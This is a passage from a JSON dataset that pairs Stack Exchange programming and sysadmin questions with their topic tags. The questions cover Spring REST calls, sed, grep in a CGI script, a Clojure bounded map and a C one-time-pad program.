    "source": "Spring Consuming Internal REST WS for MVC <eos> Sorry in advance if this is a little confusing, it's difficult how to phrase this.I am currently using Spring MVC with some RESTful services mixed in for some AJAX client side logic.  I am looking to move towards a more SOA style of coding our views.  Since the MVC and the REST service would live in the same application, is there a need to use Spring RestTemplate in the code when I need to populate objects into a Model?Right now to GET User and display in the view, the Spring MVC talks to a DAO and then adds the User into Model.  After reading a few things here on SO and Spring's Site it seems like RestTemplate could be used to get the data from a REST service and then insert into the model (if it came from a 3rd party).Is there any reason why code should (or shouldn't) move to using the RestTemplate for internal REST calls instead of just using the DOA and such?  I assume going towards SOA means moving into this style, but it seems a little clunky for calling a service that is within the same application.  But I also see the value add of having the service exist once and using it multiple times, updating in one spot instead of all over so any front end web code would be automatically updated with any changes to the service layer.Example:@RequestMapping(value={showUserTable},method={RequestMethod.GET})public String showUserTable(Model model){  List<User> users = User.getAll(); //DAO nonsense here, assume List exists  model.addAttribute(users, users);  return userTable; // returns a jsp simply looping through the list and displaying.}Is there any reason to go towards complicating these to use the internal REST Service in favor of the encapsulation I gain of SOA, or is there a cleaner way to consume these services?@RequestMapping(value={showUserTable},method={RequestMethod.GET})public String showUserTable(Model model){  List<User> users = restTemplate.getForObject(http://example.com/users, User.class);  // or however I use restTemplates, havent done it yet so still fuzzy but shouldnt be too tricky.      model.addAttribute(users, users);  return userTable; // returns a jsp simply looping through the list and displaying.}",
    "target": "java;spring;rest;spring mvc"
  },
  {
    "id": "_webmaster.9937",
    "source": "How do we customise FB share function without affecting SEO? <eos> FB share currently pulls the page title tag and first body text by default.However our title tags are optimised for SEO and we want to customise what people see when the website is shared.I thought this might be a solution:<meta name=title content=title /><meta name=description content=description  /><link rel=image_src href=thumbnail_image / >But have been told this will still conflict with the SEO? Can anyone help?",
    "target": "facebook;seo"
  },
  {
    "id": "_softwareengineering.305746",
    "source": "Can I use an external Mustache template without Ajax? <eos> I wrote up a site using Mustache to template it. Right now though, the template is embedded in the page, which defeats the purpose of using the template since I'll need to copy it to any other pages that need it.I read that it's possible to store the template in an external page, then use Ajax to load the template when needed, but this is for a school project, and I'm not yet at the point where they want us using Ajax.Is it possible to have the template externalized without the use of Ajax?Ideally, I'd like to have the following setup:...PageUsingTemnplate.htmlAnotherPageUsingTemplate.html...Template.html",
    "target": "ajax;templates"
  },
  {
    "id": "_softwareengineering.298710",
    "source": "OO Pattern for making multiple versions of domain logic available to the client <eos> I'm writing a PHP application where a block/module of domain logic is subject to frequent, significant changes over time.The complication is the application needs to be able to use not just the latest version of the module, but any version that it has previously used, so it can reproduce the results of data that that version would have made.I would use a facade and/or adapters or similar so the application's main code can switch between which versions of the module it uses without too much trouble.As for the module, I was planning to use namespacing for each major revision (where the domain logic produces different results); duplicating all the classes in that domain logic module. I.e. effectively copy-and-paste the entire thing, including classes within the module that haven't changed.This is a pungent code smell and I can't think of any way round it, let alone a simple way, given that the module may also undergo complete restructuring.Any ideas?",
    "target": "versioning"
  },
  {
    "id": "_unix.328594",
    "source": "openssl issue in Ubuntu 16.04.1 LTS and php 5.6.28-1+deb.sury.org~xenial+1 <eos> I was trying to develop a twitter streaming application on my AWS EC2 machine. The OS platform is Ubuntu 16.04.1 LTS and I have downgraded the PHP version to 5.6.28-1+deb.sury.org~xenial+1When I run the twitter streaming application on this server, I am getting the following errors.Warning: fsockopen(): Peer certificate CN=`stream.twitter.com' did not match expected CN=`199.16.156.217' in /var/www/html/myapp/streamer/twitterstreamer.php on line 620Warning: fsockopen(): Failed to enable crypto in /var/www/html/myapp/streamer/twitterstreamer.php on line 620 Warning: fsockopen(): unable to connect to ssl://199.16.156.217:443 (Unknown error) in /var/www/html/myapp/streamer/twitterstreamer.php on line 620The same code is running without any issues in another two machines (one is AWS EC2 and the another is a godaddy server).All the ports in the current EC2 machine is open now and the SSL version is OpenSSL/1.0.2g the openssl section is having the following value.Can someone help me to find where the exact issue is ?",
    "target": "ubuntu;php;openssl"
  },
  {
    "id": "_cs.19663",
    "source": "What program will derive the underlying algorithm in these question-answer pairs (updated)? <eos> Given this set of question-answer pairs, what program will derive the underlying algorithm and provide the correct answer for any question of the same format.Question-Answer Pairs (training set):B:BABA:BBBB:BAABAA:BABBAB:BBABBA:BBBBBB:BAAABAAA:BAABBAAB:BABAThose familiar with binary may notice that the training set is binary numbers with A and B substituted for 0 and 1. The answer to each question is the next binary number (using A and B). After processing the training set, the program should be able to answer questions such as the following using the algorithm it derived:BABA:?BABB:?BBBBAAA:?BAABBAAABBABA:?Constraints:The program must derive the counting algorithm only by manipulating the data given in the training set. It must not use hard coded knowledge of binary counting.Many algorithms may produce the correct answers. Therefore, the simplest algorithm is preferred. The program should assume that each answer is a transformation of the question.All questions will be in the binary format seen above, but they may be of arbitrary size.Can any existing machine learning programs/algorithms solve this? If so, how?If you believe this is unsolvable, please explain why.This update contains background to the question, explanation of the problem space, a new constraint, a proposed solution, and further questions.This problem is relevant to general machine learning where the machine must learn by observation and feedback the algorithms that govern the world around it.Based on Kolmogorov complexity, there is at least one program that can produce the correct mappings:if B, then BAif BA, then BB(etc. for all pairs in training set)This will work for every pair in the training set and nothing else. This will be the shortest program if the training set is completely random. The good news is that this is an upper bound. For any training set that is not random, there will be a smaller program that will work. Also, the number of programs smaller than upper bound is finite. A unfortunate result of Kolmogorov complexity is that it cannot be calculated. This is due to the halting problem. We can't know if any program will stop until it does.If the question is Write pi, then the program that produces the correct answer would never halt because pi has infinite digits. An answer infinitely long is never desirable so I think the best way to deal with this is to put an arbitrary limit on the length of the answer.With that additional constraint, here is an (inefficient) program that will generate a correct solution program shorter than the upper bound if one exists. (sorry of this is confusing, but these steps outline a program that generates programs that implement an algorithm to map questions to answers in a training set):Create the upper bound program. One that maps each input in the training set directly to its output.Generate every possible program that is shorter than the upper bound and list them from shortest to longest.Starting with the shortest program, run the first step of every program. Stop when a correct program is found.Eliminate programs that stop without a correct answer or produce an answer longer than the arbitrary limit.Repeat steps 3-5 running the second step, third step, etc. of the programs.This program has the following benefits:It limits the number of programs to those smaller than the upper bound program.It avoids the halting problem byincorporating an arbitrary limit to the length of the answer and executing step x in all programs before moving on to step x+1 so that the solution will be found before looping infinity.The main disadvantage is that it is terribly slow. It takes millions of years to crack a 128 bit password and I think this program could have comparable performance.Now, the questions:Do you see any significant flaws in this solution?Can this program's performance be improved in any significant waywithout introducing onerous constraints?",
    "target": "machine learning;artificial intelligence"
  },
  {
    "id": "_unix.228915",
    "source": "Replace arbitrary characters in the middle of an IP address string with sed <eos> I need to find and replace either one or two numerical characters in strings in a file.  The strings are IP addresses of the form: 10.xx.y.z Where xx can be one or two characters.  I want to replace the xx with the single character 0, so I have10.0.y.z preserving the values of y and z. The string may appear multiple times in the file.  What is the sed invocation to do this? ",
    "target": "text processing;sed"
  },
  {
    "id": "_reverseengineering.9402",
    "source": "Android malware reversing : constant values <eos> I was trying to reverse engineer an Android Malware sample and I find the following sample when decompiling the jar file I obtained by running dex2jar.  if (i >= paramBundle.length())  {    ((TextView)findViewById(2131034112)).setText(((StringBuilder)localObject).toString());    return;  }How can I find the string that 2131034112 refers to?",
    "target": "android"
  },
  {
    "id": "_cstheory.1948",
    "source": "A Boolean function that is not constant on affine subspaces of large enough dimension <eos> I'm interested in an explicit Boolean function $f \\colon \\\\{0,1\\\\}^n \\rightarrow \\\\{0,1\\\\}$ with the following property: if $f$ is constant on some affine subspace of $\\\\{0,1\\\\}^n$, then the dimension of this subspace is $o(n)$. It is not difficult to show that a symmetric function does not satisfy this propertyby considering a subspace $A=\\\\{x \\in \\\\{0,1\\\\}^n \\mid x_1 \\oplus x_2=1, x_3 \\oplus x_4=1, \\dots, x_{n-1} \\oplus x_n=1\\\\}$. Any $x \\in A$ has exactly $n/2$ $1$'s and hence $f$ is constant the subspace $A$ of dimension $n/2$.Cross-post: https://mathoverflow.net/questions/41129/a-boolean-function-that-is-not-constant-on-affine-subspaces-of-large-enough-dimen",
    "target": "cc.complexity theory;circuit complexity;derandomization;linear algebra"
  },
  {
    "id": "_unix.166502",
    "source": "How to format grep results? <eos> Wow, I could not think of a good way to title this question.  Basically I have a file called attendance with data like this:11/06/2014 101.11.001.01 FirstName LastName11/06/2014 101.11.001.01 FirstName LastName11/06/2014 101.11.001.01 FirstName LastName11/06/2014 101.11.001.01 FirstName LastNameBasically it's the date, IP address, First name, and Last name.  The above is how it is formatted in the attendance file.  I have created an html page with text boxes and a submit button where a user can either:  A.) Enter a FN/LN and receive a list of dates that person logged in, OR B.) Type in a date and receive a list of users who logged in on that date. I'm getting the results I want, but the result of the grep displayed in the browser is all on one line, like this:11/06/2014 101.11.001.01 FirstName LastName 11/06/2014 101.11.001.01 FirstName LastName 11/06/2014 101.11.001.01 FirstName LastName 11/06/2014 101.11.001.01 FirstName LastNameObviously this is sub-optimal.  I need the grep results to appear on separate lines.  Below is my .cgi file. getvars is just a script the professor made for converting variable types. Also, I'm cutting corners by only grepping last name, because nobody has the same last name:#!/bin/bash. ~/bin/getvarsif [ ! -z $LN ]; thencat attendance | grep $LNelif [ ! -z $DATE ]; thencat attendance | grep $DATEelse echo No Records FoundfiI've tried to be as concise as possible and I apologize is anything doesn't make sense.  My only question is:  How do I get the grep results on separate lines?",
    "target": "bash;grep"
  },
  {
    "id": "_cs.74569",
    "source": "Need Help Understanding Pipeline Bubbles Problem <eos> My Computer Architecture gives me this example but I cant for the life of me understand how it solved the problem.How many bubbles must be placed between the pair of SRC instructions in the presence and in the absence of data forwarding to resolve dependence?ld r2, (r4)add r6,r4,r2SolutionStaller = ldStallee = addHazard Register = r2Bubbles without/with forwarding = 3/1How does it know there is a stall?How does it know the hazard register?How did it calculate the number of bubbles?I really need help understanding this concept to do my homework. Much appreciated.",
    "target": "computer architecture"
  },
  {
    "id": "_unix.259124",
    "source": "Why can't my Unix terminal not find my matlab binaries and making Unix find them again? <eos> This happens to be a new problem because I was able to run MATLAB on the shell until today. I didn't install or update it or anything of that sort, but now I am unable run matlab in the sell. It tells me:user~ $ matlabbash: matlab: command not foundthis seems weird to me.The solution that I have tried is adding the MATLAB binaries to path. So I did:PATH=$PATH:/Applications/MATLAB_R2015a.appwhere /Applications/MATLAB_R2015a.app is the path returned by matlabroot matlab command from the GUI. I tried this but as a no surprise, it didn't work, I still can't add the MATLAB binaries to my path. How does one find the MATLAB binaries location in my system? Even if I find them, is it advised to just manually add it to my path? I also restarted my computer (OS X) but that did not work either. Any advice how to solve the issue? Re-install MATLAB?",
    "target": "shell;matlab"
  },
  {
    "id": "_codereview.121633",
    "source": "Tracking the bounding box of a map <eos> ContextI have a bunch of data points that look roughly like this:(defn rand-key []  (into [] (repeatedly 3 #(- (rand-int 19) 9))))(defn rand-val []  (rand-nth [:foo :bar :baz :qux]))(def data (into {} (repeatedly 10 (fn [] [(rand-key) (rand-val)]))))Obviously the actual coordinates would have a much greater range, the actual values would hold some sort of information, and the actual number of data points would be far greater, but you get the idea.This data structure is going to be evolving over time (so I'll probably store it in an atom or something like that), and as it evolves, I want to be able to quickly find the bounding box for the points it contains in its current state.The easiest way to do that for an n-dimensional dataset is to keep n independent sets of its keys, each one sorted in one dimension. Since I can't be bothered to write a proper comparator in Clojure, though, I'm going to replace each of those sets with a sorted map from a coordinate in a particular dimension to the number of data points that have that coordinate in that dimension:(def keymaps (mapv (fn [dimension]                     (->> (keys data)                          (map #(get % dimension))                          frequencies                          (into (sorted-map))))                   (range 3)))With this, it's trivial to find the bounding box of the dataset:(def bounds (mapv (juxt (comp key first) (comp key first rseq)) keymaps))ProblemNow, no matter what I do, I have to update my data and my keymaps together. Maybe, like I suggested above, I have an atom that stores some current state, and in that case that atom would look like this:(def state (atom {:data data :keymaps keymaps}))Any time I update state, I can't just use the built-in Clojure functions to update the :data because that would cause the :keymaps to become outdated. I could write my own functions to replace assoc and dissoc that would keep the two in sync, but then I wouldn't be able to make use of all the great higher-level functions (such as merge) that are built on top of the original, polymorphic assoc and dissoc.SolutionSo I decided to take the most painful approach possible: build a custom map type that allows efficient bounding box queries using the scheme detailed above. First things first, some protocols:(defprotocol Space  (dimension [this]))(defprotocol Bounded  (bounds [this]))Since I need to store extra data alongside an existing map, I can't just use extend-type on the PersistentHashMap class. No, I need a far more powerful tool: deftype! I'll have one field for the underlying data map and another for the vector of keymaps.In most cases, I could get away with just implementing the map abstraction directly, but I don't want to tie myself to a particular implementation for the wrapped map. What if later I decide that I want to use a quadtree or an octree for the underlying map, to allow for efficient queries of subspaces? To prevent myself from having to extend more protocols to my bounded map type than I need to, I'll just provide a way to get the wrapped map and query that:(defprotocol Wrapper  (wrapped [this]))And here's the deftype itself. Prepare for boilerplate:(import (clojure.lang Associative                      Counted                      ILookup                      IPersistentCollection                      IPersistentMap                      Seqable))(declare ->BoundedMap)(deftype BoundedMap [m keymaps]  Seqable  (seq [_] (seq m))  IPersistentCollection  (cons [this [k v]] (assoc this k v))  (empty [_] (->BoundedMap (empty m) (mapv empty keymaps)))  (equiv [_ x] (= m x))  ILookup  (valAt [_ k] (get m k))  (valAt [_ k not-found] (get m k not-found))  Associative  (containsKey [_ k] (contains? m k))  (entryAt [_ k] (find m k))  Counted  (count [_] (count m))  IPersistentMap  (assoc [_ k v]    (->BoundedMap (assoc m k v)                  (if (contains? m k)                    keymaps                    (mapv #(update %1 %2 (fnil inc 0)) keymaps k))))  (without [_ k]    (->BoundedMap (dissoc m k)                  (if (contains? m k)                    (mapv #(if (< 1 (get %1 %2))                             (update %1 %2 dec)                             (dissoc %1 %2))                          keymaps k)                    keymaps)))  Wrapper  (wrapped [_] m)  Space  (dimension [_] (count keymaps))  Bounded  (bounds [_]    (mapv (fn [keymap] (mapv #(key (first (% keymap))) [seq rseq])) keymaps)))And of course, what data structure would be complete without a nifty little constructor function?(defn bounded-map [dimension m]  (->> (keys m)       (iterate (partial map rest))       (take dimension)       (mapv #(into (sorted-map) (frequencies (map first %))))       (->BoundedMap m)))Now I can define my atom like this instead of what I had before:(def state (atom (bounded-map 3 data)))Pretty much all of the Clojure tools for maps will work properly, I can get bounding boxes at my leisure, and if I ever switch to a more featured map implementation for the data itself, I can always compose those extra functions with wrapped.QuestionsIs this the right approach?Is there a way to make = work properly without implementing java.util.Map (yuck)?Can this code be improved in any other way?",
    "target": "clojure;coordinate system"
  },
  {
    "id": "_webapps.3120",
    "source": "Changing your username on Delicious <eos> Is it possible to change your username on Delicious? I have an old account with all my bookmarks and I would like to change my username.Is the only solution exporting your existing bookmarks from your old account and importing them in your new account? Anyone has experience with this?",
    "target": "delicious;username"
  },
  {
    "id": "_codereview.103820",
    "source": "WebApi Get with paging <eos> How can I improve this code?public virtual HttpResponseMessage Get(int pageNo, int pageSize){    pageNo = pageNo > 0 ? pageNo - 1 : 0;    pageSize = pageSize > 0 ? pageSize : 0;    int total = repository.Table.Count();    int pageCount = total > 0 ? (int)Math.Ceiling(total / (double)pageSize) : 0;    var entity = repository.Table.OrderBy(c => c.ID).Skip(pageNo * pageSize).Take(pageSize);    if (entity.Count() == 0 || entity == null)    {        var message = string.Format({0}: No content, GenericTypeName);        return ErrorMsg(HttpStatusCode.NotFound, message);    }    var response = Request.CreateResponse(HttpStatusCode.OK, entity);    response.Headers.Add(X-Paging-PageNo, (pageNo + 1).ToString());    response.Headers.Add(X-Paging-PageSize, pageSize.ToString());    response.Headers.Add(X-Paging-PageCount, pageCount.ToString());    response.Headers.Add(X-Paging-TotalRecordCount, total.ToString());    return response;}",
    "target": "c#;pagination;asp.net web api"
  },
  {
    "id": "_codereview.80515",
    "source": "Whose line is it anyway? <eos> I've just started delving into JavaFX, and the following is essentially my Hello World. Although it's simple, I question the code formatting and wonder if I'm breaking any conventions, especially if explicitly concerning the library.I also find myself concerned with what best promotes readability. Unfamiliarity brought many an alteration between styles. e.g. for statements, whether it is preferable to instantiate, modify and add an object all at once or simply pairing similar things together and modifying them wherever necessary and adding them at the end -- my final code here is an amalgamation of both styles.This last bit may be delving a bit into SO/Programmers territory, but I'm curious.  I found myself using anonymous inner classes as it made methods easily transportable; I've hitherto not used it more than once in a program, is this bad form? If so, why?import javafx.application.Application;import javafx.beans.value.ObservableValue;import javafx.scene.Group;import javafx.scene.Scene;import javafx.scene.control.Slider;import javafx.scene.paint.Color;import javafx.scene.shape.Line;import javafx.scene.shape.StrokeLineCap;import javafx.scene.text.Text;import javafx.stage.Stage;public class DrawingLines extends Application {    public static void main(String[] args) {        launch(args);    }    @Override    public void start(Stage primaryStage) {        primaryStage.setTitle(Legato's Lines);        Group root = new Group();        Scene scene = new Scene(root, 300, 150, Color.GRAY);        Line redLine = new Line(10, 10, 200, 10) {            {                setStroke(Color.RED);                setStrokeWidth(3);                getStrokeDashArray().addAll(10d, 5d, 15d, 5d, 20d);                setStrokeDashOffset(0);            }        };        Line whiteLine = new Line(10, 30, 200, 30) {            {                setStroke(Color.WHITE);                setStrokeLineCap(StrokeLineCap.ROUND);                setStrokeWidth(10);            }        };        Line blueLine = new Line(10, 50, 200, 50) {            {                setStroke(Color.BLUE);                setStrokeLineCap(StrokeLineCap.BUTT);                setStrokeWidth(5);            }        };        Slider slider = new Slider(0, 100, 0) {            {                setLayoutX(10);                setLayoutY(95);            }        };        Text offsetText = new Text(Stroke Dash Offset: 0) {            {                setX(10);                setY(80);                setStroke(Color.WHITE);            }        };        slider.valueProperty().addListener(            (ov, curVal, newVal) -> offsetText.setText(                Stroke Dash Offset:  + Math.round(slider.getValue()))        );        redLine.strokeDashOffsetProperty().bind(slider.valueProperty());        root.getChildren().add(redLine);        root.getChildren().add(whiteLine);        root.getChildren().add(blueLine);        root.getChildren().add(slider);        root.getChildren().add(offsetText);        primaryStage.setScene(scene);        primaryStage.show();    }}",
    "target": "java;beginner;gui;javafx"
  },
  {
    "id": "_codereview.163586",
    "source": "Project Euler Problem 8: Largest product in a series <eos> The problem statement is as follows:The four adjacent digits in the 1000-digit number that have the greatest product are 9  9  8  9 = 5832.73167176531330624919225119674426574742355349194934  96983520312774506326239578318016984801869478851843  85861560789112949495459501737958331952853208805511  12540698747158523863050715693290963295227443043557  66896648950445244523161731856403098711121722383113  62229893423380308135336276614282806444486645238749  30358907296290491560440772390713810515859307960866  70172427121883998797908792274921901699720888093776  65727333001053367881220235421809751254540594752243  52584907711670556013604839586446706324415722155397  53697817977846174064955149290862569321978468622482  83972241375657056057490261407972968652414535100474  82166370484403199890008895243450658541227588666881  16427171479924442928230863465674813919123162824586  17866458359124566529476545682848912883142607690042  24219022671055626321111109370544217506941658960408  07198403850962455444362981230987879927244284909188  84580156166097919133875499200524063689912560717606  05886116467109405077541002256983155200055935729725  71636269561882670428252483600823257530420752963450Find the thirteen adjacent digits in the 1000-digit number that have the greatest product. What is the value of this product?My code below solves the problem.I know this enters into the realm of preference but is it taboo to merge the 100 digit number onto a single line as I initially did but commented out, or is the method utilizing StringBuilder for readability better?public class Program{           public static void Main(string[] args)    {        //string numbers = 7316717653133062491922511967442657474235534919493496983520312774506326239578318016984801869478851843858615607891129494954595017379583319528532088055111254069874715852386305071569329096329522744304355766896648950445244523161731856403098711121722383113622298934233803081353362766142828064444866452387493035890729629049156044077239071381051585930796086670172427121883998797908792274921901699720888093776657273330010533678812202354218097512545405947522435258490771167055601360483958644670632441572215539753697817977846174064955149290862569321978468622482839722413756570560574902614079729686524145351004748216637048440319989000889524345065854122758866688116427171479924442928230863465674813919123162824586178664583591245665294765456828489128831426076900422421902267105562632111110937054421750694165896040807198403850962455444362981230987879927244284909188845801561660979191338754992005240636899125607176060588611646710940507754100225698315520005593572972571636269561882670428252483600823257530420752963450;        string numbers = Get100DigitNumber();        Console.WriteLine(MaxProductNumericStringOfLength(numbers,13));    }    static long ProductOfNumericString(string number)    {        long product = 1;        for (int digit = 0; digit<number.Length ; digit++)        {            product *= int.Parse(number[digit].ToString());        }        return product;    }    static long MaxProductNumericStringOfLength(string numberString, int length)    {        long maxSubstring=0;        long possibleMaxSubstring;        for (int position = 0; position < numberString.Length-length ; position++)        {            possibleMaxSubstring = ProductOfNumericString(numberString.Substring(position,length));            if (possibleMaxSubstring > maxSubstring)                maxSubstring=possibleMaxSubstring;        }        return maxSubstring;    }    static string Get100DigitNumber()    {        StringBuilder sb = new StringBuilder();        sb.Append(73167176531330624919225119674426574742355349194934);        sb.Append(96983520312774506326239578318016984801869478851843);        sb.Append(85861560789112949495459501737958331952853208805511);        sb.Append(12540698747158523863050715693290963295227443043557);        sb.Append(66896648950445244523161731856403098711121722383113);        sb.Append(62229893423380308135336276614282806444486645238749);        sb.Append(30358907296290491560440772390713810515859307960866);        sb.Append(70172427121883998797908792274921901699720888093776);        sb.Append(65727333001053367881220235421809751254540594752243);        sb.Append(52584907711670556013604839586446706324415722155397);        sb.Append(53697817977846174064955149290862569321978468622482);        sb.Append(83972241375657056057490261407972968652414535100474);        sb.Append(82166370484403199890008895243450658541227588666881);        sb.Append(16427171479924442928230863465674813919123162824586);        sb.Append(17866458359124566529476545682848912883142607690042);        sb.Append(24219022671055626321111109370544217506941658960408);        sb.Append(07198403850962455444362981230987879927244284909188);        sb.Append(84580156166097919133875499200524063689912560717606);        sb.Append(05886116467109405077541002256983155200055935729725);        sb.Append(71636269561882670428252483600823257530420752963450);        return sb.ToString();    }}",
    "target": "c#;beginner;programming challenge"
  },
  {
    "id": "_webapps.107754",
    "source": "Line After Table <eos> It seems that if you insert a table into a document, there is always a new line after it. This can be quite frustrating if the table is tall, as it keeps adding a blank page that is not required beneath the table.Is there some special way of removing that line?",
    "target": "google documents"
  },
  {
    "id": "_webmaster.59146",
    "source": "Paging next/previous links with Google escape fragment <eos> I have paging URLs below and the page uses AJAX to do paging. Do I need to add _escaped_fragment_= to the URL below or are those URLs fine?<link rel=prev href=http://example.com/youth-basketball-tournaments/kansas?page=4 /><link rel=prev href=http://example.com/youth-basketball-tournaments/kansas?page=5 />",
    "target": "seo;google;ajax;pagination"
  },
  {
    "id": "_cs.57515",
    "source": "How to compute amortized complexity of n runs of Dijkstra's algorithm? <eos> I'm trying to figure out how to compute an amortized complexity/ or complexity of this algorithm. We have a Graph which is oriented. And we are going to run Dijkstra's algorithm for finding a shortest path between vertices, but it has to start only in those vertices, which has no input edge going to this vertex (the vertices with red color).So Dijkstra would be runned only from red vertices. If we run Dijkstra on all vertices, we could assume that complexity is |V|*Dijkstra but in this case we do not need such big complexity. As is one Dijkstra big, another Dijkstra from another vertex would be runned on less vertices. The more Dijkstras we run, the less vertices could be visited.Dijkstra from all vertices should have |V|(|E|+|V|*log|V|) complexity. This complexity should be much lower but I can't figure out where to compute.",
    "target": "graph theory;graphs;time complexity;amortized analysis"
  },
  {
    "id": "_codereview.41748",
    "source": "Small one time pad encryption program <eos> This one time pad encryption program I have written (basically just an XOR encryption program) seems to be working fine, compiling nicely (gcc -o ./OTP.c), and doing what it's supposed to. However I would like to improve it as much as possible which is why I am posting this.I am particularly insecure about the memory allocation. Any suggestions regarding improvements are more than welcome!The code in its entirety is found below and can also be found on Github: PrivacyProject/OTP-Encryption.#include <stdio.h>#include <stdlib.h>#include <sys/stat.h>#include <sys/mman.h>int main(int argc, char **argv){struct stat statbuf;struct stat keybuf;char buffer [20];int key;int data;int output;int count;char ans;int * buf;FILE * keyfile;FILE * sourcefile;FILE * destfile;if(geteuid() !=0){printf(Root access is required to run this program\\n\\n);exit(0);}if(argc<4){printf(\\n);printf(    OTP 1.0 \\n\\n);printf(    This program encrypts a  file using a random key\\n);printf(    and  generates an output file with the resulting\\n);printf(    cipher.  Decryption is achieved  by  running the\\n);printf(    output file as source file  with the same key.\\n\\n);printf(    WARNING: The security of the encryption provided\\n);printf(    by this program is entirely dependent on the key\\n);printf(    file.  The keyfile should meet the  requirements\\n);printf(    below:\\n);printf(    - Be of the same size or larger than the\\n);printf(      source file.\\n);printf(    - Be completely random, preferably generated by \\n);printf(      a Hardware Random Number Generator.\\n);  printf(    - NEVER be reused!\\n\\n);printf(    The  author takes no  responsibility  for use of\\n);printf(    this program. Available under GNU General Public\\n);printf(    Licence v.2\\n\\n);printf(    USAGE: OTP <source file> <output file> <keyfile>\\n\\n);return (0);}/* Check number of arguments. */if(argc>4){printf(Too many arguments.\\n);printf(USAGE: OTP <source file> <output file> <keyfile>\\n);exit(1);}/* Allocate memory required by processes */buf = (int*) malloc (sizeof(int));if (buf == NULL){perror(Error);exit(1);}/* Lock down pages mapped to processes */printf(Locking down processes...\\n\\n);if(mlockall (MCL_CURRENT | MCL_FUTURE) < 0){perror(mlockall);exit (1);}/* Check if sourcefile can be opened. */if((sourcefile = fopen(argv[1], rb))== NULL){printf(Can't open source file\\n);perror(Error);printf(USAGE: OTP <source file> <output file> <keyfile>\\n);exit (1);}/* Get size of sourcefile */fstat(fileno(sourcefile), &statbuf); /* Check if keyfile can be opened. */if((keyfile = fopen(argv[3], rb))== NULL){printf(Can't open keyfile.\\n);perror(Error);printf(USAGE: OTP <source file> <output file> <keyfile>\\n);exit(1);}                               /* Get size of keyfile */fstat(fileno(keyfile), &keybuf);/* Check if keyfile is the same size as, or bigger than the sourcefile */if((keybuf.st_size) < (statbuf.st_size)){printf(Source file is larger than keyfile.\\n);printf(This significantly reduces cryptographic strength.\\n);printf(Do you wish to continue? (Y/N)\\n);fgets(buffer, 20, stdin);sscanf(buffer, %c, &ans);if(ans == 'n' || ans == 'N'){exit (1);}if(ans == 'y' || ans == 'Y'){    printf(Proceeding with Encryption/Decryption.\\n);    }else{printf(No option selected. Exiting...\\n);exit (1);}}   /* Check if destfile can be opened. */if((destfile = fopen(argv[2], wb))== NULL){printf(Can't open output file.\\n);perror(Error);exit(1);                    }    /* Encrypt/Decrypt and write to output file. */while(count < (statbuf.st_size)){key=fgetc(keyfile);data=fgetc(sourcefile);output=(key^data);fputc(output,destfile);count++;}/* Close files. */fclose(keyfile);fclose(sourcefile);fclose(destfile);printf(Encryption/Decryption Complete.\\n\\n);/* delete Source file option. */printf(Do you wish to delete the source file? (Y/N)\\n);fgets(buffer, 20, stdin);sscanf(buffer, %c, &ans);if(ans == 'y' || ans == 'Y'){    if ( remove(argv[1]) == 0)    {    printf(File deleted successfully.\\n);    }    else    {    printf(Unable to delete the file.\\n);    perror(Error);    exit(1);    }}/* delete keyfile option. */printf(Do you wish to delete the keyfile? (Y/N)\\n);fgets(buffer, 20, stdin);sscanf(buffer, %c, &ans);if(ans == 'y' || ans == 'Y'){    if ( remove(argv[3]) == 0)    {    printf(File deleted successfully.\\n);    }    else    {    printf(Unable to delete the file.\\n);    perror(Error);    exit(1);    }}/* cleanup */printf(Releasing memory.\\n);free (buf);return(0);}",
    "target": "c;beginner;memory management;cryptography"
  },
  {
    "id": "_webapps.13692",
    "source": "Copy favorite songs and artists from Pandora to Last.fm? <eos> Is there a automagical way that I can copy my favorites from Pandora to Last.FM?",
    "target": "music;pandora;last.fm"
  },
  {
    "id": "_unix.140946",
    "source": "Keyboard layout isn't changed in Chromium under Debian <eos> I have a problem with switching layouts in Chromium. If I switch keyboard layout it changes successfully, but I can't still type Cyrillic (or other) symbols in Chromium. I found out that actually keyboard layout is changed in Chromium, because symbols like ?,  and  are on the different places (they are in placesion which they should be in the current layout), but I can't type letters from the current layout.So for example I'm in English layout - I can type any letters etc. without any problems. Then I switch my layout to Russian (for example), after that I can't type any Cyrillic letters at all, I still can type only Latin letters.",
    "target": "debian;keyboard layout;chrome"
  },
  {
    "id": "_codereview.48002",
    "source": "Calculating total sales from each member <eos> I am building a new system that is using some tables from an old system.For each user on this new system, I need to go to the old system and total up their sales.  Currently it takes between 2-5 minutes to load.public static List<DailyTeamGoal> GetListDailyTeamGoals(int teamId){    string teamGoal = ;    List<ProPit_User> lstProPit_User = new List<ProPit_User>();    using (ProsPitEntities db = new ProsPitEntities())    {        // Find the team        Team team = db.Teams.Where(x => x.teamID == teamId).FirstOrDefault();        if (team != null)        {            // Grab team goal            teamGoal = Convert.ToString(team.goal);        }        // Make a list of all users who are on the team        lstProPit_User = db.ProPit_User.Where(x => x.teamID == teamId).ToList();    }    List<DailyTeamGoal> lstDailyTeamGoal = new List<DailyTeamGoal>();    using (TEntities db = new TEntities())    {        //have to get every day of the month        DateTime dt = DateTime.Now;        int days = DateTime.DaysInMonth(dt.Year, dt.Month);        decimal orderTotal = 0m;        for (int day = 1; day <= days; day++)        {            // For every day in the month total the sales            DailyTeamGoal dtg = new DailyTeamGoal();            dtg.Date = day.ToString(); //dt.Month + / + day; + / + dt.Year;            dtg.TeamGoal = teamGoal;            decimal orderTotalRep = 0m;            foreach (var propit_User in lstProPit_User)            {                DateTime dtStartDate = Convert.ToDateTime(dt.Month + / + day + / + dt.Year);                DateTime dtEndDate = dtStartDate.AddDays(1);                var lstorderTotalRep = (from o in db.Orders                                    where o.DateCompleted >= dtStartDate                                    where o.DateCompleted <= dtEndDate                                    where (o.Status == 1 || o.Status == 2)                                    where o.Kiosk != 0                                    where o.SalesRepID == propit_User.SalesRepID                                    orderby o.OrderTotal descending                                    select o.OrderTotal).ToList();                foreach (var item in lstorderTotalRep)                {                    //orderTotalRep =+ item;                    orderTotalRep += item;                }            }            orderTotal += orderTotalRep;            dtg.DailyTotal = orderTotal;            lstDailyTeamGoal.Add(dtg);        }    }    return lstDailyTeamGoal;}The above code will use my site to find the teamID the logged in person is on.  It will then find all members who are on that team.  For each member it finds it will calculate the total sales and then spit me back a list.  Any way to speed this up?",
    "target": "c#;performance;linq;entity framework;asp.net mvc 4"
  },
  {
    "id": "_unix.251375",
    "source": "Mounted dir disappears after restart <eos> I ran this command on RHEL 6.3:# mount /dev/cdrom /mntEverything is okay, but after a restart the mounted dir, /mnt disappears...I don't know where is it going.",
    "target": "rhel;mount"
  },
  {
    "id": "_softwareengineering.133935",
